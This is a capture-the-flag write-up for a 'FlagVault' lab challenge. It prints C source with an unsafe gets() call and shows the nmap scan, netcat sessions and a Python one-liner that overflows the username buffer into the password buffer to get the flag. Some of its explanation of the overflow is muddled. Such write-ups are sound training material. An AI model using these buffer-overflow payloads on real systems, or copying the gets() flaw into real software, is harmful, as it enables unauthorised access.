```Description
_Flags have been omitted from this writeup per platform guidelines._
 
Cipher asked me to create the most secure vault for flags, so I created a vault that cannot be accessed. You don't believe me? Well, here is the code with the password hardcoded. Not that you can do much with it anymore.
**Note:** To start the target machine, click the Start Machine button:
Start Machine
You can use the following command to connect to the machine:
`nc MACHINE_IP 1337`
_This challenge was originally a part of the Hackfinity Battle 2025 CTF Event._
```
Source Code 
```Source_code
Download the source code from (https://drive.google.com/file/d/1kYIR2JEfLfbzifHgpGBj2xuBgGxNLp46/view?usp=sharing)

#include <stdio.h>
#include <string.h>

void print_banner(){
	printf( "  ______ _          __      __         _ _   \n"
 		" |  ____| |         \\ \\    / /        | | |  \n"
		" | |__  | | __ _  __ \\ \\  / /_ _ _   _| | |_ \n"
		" |  __| | |/ _` |/ _` \\ \\/ / _` | | | | | __|\n"
		" | |    | | (_| | (_| |\\  / (_| | |_| | | |_ \n"
		" |_|    |_|\\__,_|\\__, | \\/ \\__,_|\\__,_|_|\\__|\n"
		"                  __/ |                      \n"
		"                 |___/                       \n"
		"                                             \n"
		"Version 1.0 - Passwordless authentication evolved!\n"
		"==================================================================\n\n"
	      );
}

void print_flag(){
	FILE *f = fopen("flag.txt","r");
	char flag[200];

	fgets(flag, 199, f);
	printf("%s", flag);
}

void login(){
	char password[100] = "";
	char username[100] = "";

	printf("Username: ");
	gets(username);

	// If I disable the password, nobody will get in.
	//printf("Password: ");
	//gets(password);

	if(!strcmp(username, "bytereaper") && !strcmp(password, "5up3rP4zz123Byte")){
		print_flag();
	}
	else{
		printf("Wrong password! No flag for you.");
	}
}

void main(){
	setvbuf(stdin, NULL, _IONBF, 0);
	setvbuf(stdout, NULL, _IONBF, 0);
	setvbuf(stderr, NULL, _IONBF, 0);

	// Start login process
	print_banner();
	login();

	return;
}
```
IP_Address
```IP_Address 
10.10.130.75
```
after running nmap we got the result 
```bash 
nmap -p- 10.10.130.70 
Nmap scan report for 10.10.130.75
Host is up (0.21s latency).
Not shown: 65533 closed tcp ports (reset)       
PORT     STATE SERVICE         
22/tcp   open  ssh
1337/tcp open  waste
```
we then find out the we get `nc 10.10.130.75 1337` then we got

```bash 
nc 10.10.130.75 1337
  ______ _          __      __         _ _   
 |  ____| |         \ \    / /        | | |  
 | |__  | | __ _  __ \ \  / /_ _ _   _| | |_ 
 |  __| | |/ _` |/ _` \ \/ / _` | | | | | __|
 | |    | | (_| | (_| |\  / (_| | |_| | | |_ 
 |_|    |_|\__,_|\__, | \/ \__,_|\__,_|_|\__|
                  __/ |                      
                 |___/                       
                                             
Version 1.0 - Passwordless authentication evolved!
Username: bytereaperAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Wrong password! No flag for you.    
```
then we attempt my more things but first lets investigate the source code & after investigation we found out that 
```The program checks whether:
username` is "bytereaper"   
password` is "5up3rP4zz123Byte"
```
after this we  discover that we need to play with binary codes 0/1 and then we can have the flag so firstly we try 
```bash
echo -ne "bytereaper$(python3 -c 'print("A"*94 + "5up3rP4zz123Byte")')\n"
```
then we execute the netcat 
```bash 
nc IP_Address 1337 
Username: bytereaperAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA5up3rP4zz123Byte
Wrong password! No flag for you.  
```
which is definitely wrong cause we need to overflow the binary code and code limit is 100 and we trying on 94 now lets overflow 
`python3 -c "import sys; sys.stdout.buffer.write(b'bytereaper\x00' + b'A'*101 + b'5up3rP4zz123Byte' + b'\n')"` 
- `python3 -c "..."`: Runs Python code from the command line.
- `import sys`: Imports system module.
- `sys.stdout.buffer.write(...)`: Sends raw bytes to output (not regular text).
- `b'bytereaper\x00'`: Null-terminated username.
- `b'A'*101`: Padding to align memory or overflow buffer.
- `b'5up3rP4zz123Byte'`: The password you're injecting.
- `b'\n'`: Pressing "Enter" to submit input.

```bash 
python3 -c "import sys; sys.stdout.buffer.write(b'bytereaper\x00' + b'A'*101 + b'5up3rP4zz123Byte' + b'\n')" | nc 10.10.130.75 1337
  ______ _          __      __         _ _   
 |  ____| |         \ \    / /        | | |  
 | |__  | | __ _  __ \ \  / /_ _ _   _| | |_ 
 |  __| | |/ _` |/ _` \ \/ / _` | | | | | __|
 | |    | | (_| | (_| |\  / (_| | |_| | | |_ 
 |_|    |_|\__,_|\__, | \/ \__,_|\__,_|_|\__|
                  __/ |                      
                 |___/
Version 1.0 - Passwordless authentication evolved!
==================================================================
Username: [flag omitted]
```
then when we execute with 101 we got the Flag 
```Flag 
[flag omitted]
```
